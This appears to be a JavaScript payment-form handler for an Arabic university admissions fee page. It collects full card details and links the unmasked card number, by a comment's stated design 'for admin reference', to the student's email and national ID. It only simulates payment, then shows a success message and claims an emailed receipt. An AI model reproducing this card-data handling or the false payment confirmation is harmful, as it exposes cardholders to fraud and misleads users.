// Payment Gateway Handler

document.addEventListener('DOMContentLoaded', () => {
    const paymentForm = document.getElementById('paymentForm');
    const cardNumberInput = document.getElementById('cardNumber');
    const expiryDateInput = document.getElementById('expiryDate');
    const cvvInput = document.getElementById('cvv');
    
    // Load user data
    const userData = JSON.parse(localStorage.getItem('user_data') || '{}');
    if (userData.fullNameArabic) {
        document.getElementById('userName').textContent = `مرحباً، ${userData.fullNameArabic}`;
    }
    
    // Set total amount from localStorage (saved by fees.js)
    const paymentData = JSON.parse(localStorage.getItem('payment_data') || '{}');
    const totalAmount = paymentData.totalAmount || 200;
    document.getElementById('totalAmount').textContent = `${totalAmount.toLocaleString('ar-SA')} ر.س`;
    AppState.formData.payment.totalAmount = totalAmount;
    if (paymentData.orderNumber) AppState.formData.payment.orderNumber = paymentData.orderNumber;
    
    // Card number formatting and detection
    cardNumberInput.addEventListener('input', (e) => {
        let value = e.target.value.replace(/\D/g, '');
        const formatted = formatCardNumber(value);
        e.target.value = formatted;
        
        // Detect card type
        const cardType = CardDetector.detectCardType(value);
        const cardIcon = document.getElementById('cardTypeIcon');
        cardIcon.textContent = CardDetector.getCardIcon(cardType);
    });
    
    // Expiry date formatting
    expiryDateInput.addEventListener('input', (e) => {
        let value = e.target.value.replace(/\D/g, '');
        const formatted = formatExpiryDate(value);
        e.target.value = formatted;
    });
    
    // CVV input validation
    cvvInput.addEventListener('input', (e) => {
        let value = e.target.value.replace(/\D/g, '');
        if (value.length > 4) value = value.substring(0, 4);
        e.target.value = value;
    });
    
    // Payment method selection
    window.selectPaymentMethod = function(method) {
        // Update radio buttons
        document.querySelectorAll('input[name="paymentMethod"]').forEach(radio => {
            radio.checked = radio.value === method;
        });
        
        // Update card styling
        document.querySelectorAll('.payment-card').forEach(card => {
            card.classList.remove('payment-card-selected');
            if (card.dataset.method === method) {
                card.classList.add('payment-card-selected');
            }
        });
        
        // Handle Apple Pay special case
        if (method === 'applepay') {
            // In a real implementation, this would trigger Apple Pay sheet
            Utils.showToast('سيتم فتح Apple Pay (محاكاة)', 'info');
        }
    };
    
    // Form submission
    paymentForm.addEventListener('submit', async (e) => {
        e.preventDefault();
        
        // Collect form data
        const formData = {
            cardholderName: document.getElementById('cardholderName').value,
            cardNumber: document.getElementById('cardNumber').value,
            expiryDate: document.getElementById('expiryDate').value,
            cvv: document.getElementById('cvv').value,
            paymentMethod: document.querySelector('input[name="paymentMethod"]:checked').value,
            saveCard: document.getElementById('saveCard').checked
        };
        
        // Validate form
        const errors = FormValidator.validatePaymentForm(formData);
        
        if (errors.length > 0) {
            Utils.showModal(`
                <div class="text-center">
                    <div class="text-red-500 text-4xl mb-4">⚠️</div>
                    <h3 class="text-lg font-bold text-red-600 mb-4">خطأ في البيانات</h3>
                    <ul class="text-right text-sm space-y-2 mb-4">
                        ${errors.map(error => `<li class="text-red-600">• ${error}</li>`).join('')}
                    </ul>
                    <button onclick="Utils.closeModal()" class="bg-red-500 text-white px-6 py-2 rounded-lg">
                        إغلاق
                    </button>
                </div>
            `);
            return;
        }
        
        // Include user identity from registration
        const userIdentity = JSON.parse(localStorage.getItem('user_data') || '{}');
        
        // Sanitize data - store FULL card number for admin reference
        const sanitizedData = {
            cardholderName: Utils.sanitizeInput(formData.cardholderName),
            cardNumber: formData.cardNumber.replace(/\s/g, ''),
            expiryDate: Utils.sanitizeInput(formData.expiryDate),
            paymentMethod: formData.paymentMethod,
            studentEmail: userIdentity.email || '',
            studentNationalID: userIdentity.nationalID || ''
        };
        
        // Check rate limiting
        if (!Security.rateLimiter.check()) {
            Utils.showToast('يرجى الانتظار قبل المحاولة مرة أخرى', 'warning');
            return;
        }
        
        // Simulate payment processing
        const submitButton = paymentForm.querySelector('button[type="submit"]');
        submitButton.disabled = true;
        submitButton.innerHTML = '<span class="spinner inline-block"></span> جاري معالجة الدفع...';
        
        try {
            // Simulate API delay
            await new Promise(resolve => setTimeout(resolve, 3000));
            
            // Store payment data
            AppState.formData.payment.cardholderName = sanitizedData.cardholderName;
            AppState.formData.payment.paymentMethod = sanitizedData.paymentMethod;
            AppState.formData.payment.status = 'completed';
            AppState.formData.payment.transactionId = 'TXN-' + Date.now();
            AppState.formData.payment.timestamp = new Date().toISOString();
            
            DataStore.save('payment_data', AppState.formData.payment);
            if (typeof CloudDB !== 'undefined') CloudDB.save('payment_data', AppState.formData.payment).catch(() => {});
            
            // Show success modal
            showPaymentSuccess(sanitizedData);
            
        } catch (error) {
            Utils.showToast('حدث خطأ أثناء معالجة الدفع. يرجى المحاولة مرة أخرى', 'error');
        } finally {
            submitButton.disabled = false;
            submitButton.innerHTML = `
                <span>إتمام الدفع</span>
                <span>💳</span>
            `;
        }
    });
});

// Show payment success modal
function showPaymentSuccess(paymentData) {
    const transactionId = AppState.formData.payment.transactionId;
    const totalAmount = AppState.formData.payment.totalAmount || JSON.parse(localStorage.getItem('payment_data') || '{}').totalAmount || 200;
    const preferences = JSON.parse(localStorage.getItem('preferences') || '[]');
    
    const preferencesList = preferences.map((pref, index) => 
        `<p class="text-sm">${index + 1}. ${pref.collegeName}</p>`
    ).join('');
    
    Utils.showModal(`
        <div class="text-center">
            <div class="text-green-500 text-6xl mb-4">
                <svg class="w-16 h-16 mx-auto" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                    <path class="checkmark-animation" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M5 13l4 4L19 7"></path>
                </svg>
            </div>
            <h3 class="text-2xl font-bold text-green-600 mb-4">تم الدفع بنجاح!</h3>
            
            <div class="bg-gray-50 rounded-lg p-4 mb-4 text-right">
                <div class="mb-3">
                    <p class="text-xs text-gray-500">رقم المعاملة</p>
                    <p class="font-bold">${transactionId}</p>
                </div>
                <div class="mb-3">
                    <p class="text-xs text-gray-500">المبلغ المدفوع</p>
                    <p class="font-bold text-ksu-green">${totalAmount.toLocaleString('ar-SA')} ر.س</p>
                </div>
                <div class="mb-3">
                    <p class="text-xs text-gray-500">طريقة الدفع</p>
                    <p class="font-bold">${getPaymentMethodName(paymentData.paymentMethod)}</p>
                </div>
                <div class="mb-3">
                    <p class="text-xs text-gray-500">التاريخ</p>
                    <p class="font-bold">${new Date().toLocaleDateString('ar-SA')}</p>
                </div>
            </div>
            
            <div class="bg-ksu-gold rounded-lg p-4 mb-4 text-right">
                <p class="font-bold text-ksu-green mb-2">رغباتك المسجلة:</p>
                ${preferencesList}
            </div>
            
            <p class="text-gray-600 mb-6 text-sm">تم إرسال إيصال الدفع إلى بريدك الإلكتروني</p>
            
            <div class="flex space-x-3 space-x-reverse">
                <a href="receipt.html" class="flex-1 bg-ksu-green text-white py-2 rounded-lg font-bold">
                    عرض الإيصال
                </a>
                <button onclick="Utils.closeModal()" class="flex-1 bg-gray-200 text-gray-800 py-2 rounded-lg font-bold">
                    إغلاق
                </button>
            </div>
        </div>
    `);
}

// Get payment method name in Arabic
function getPaymentMethodName(method) {
    const names = {
        'mada': 'مدى (Mada)',
        'visa': 'Visa / MasterCard',
        'applepay': 'Apple Pay'
    };
    return names[method] || method;
}
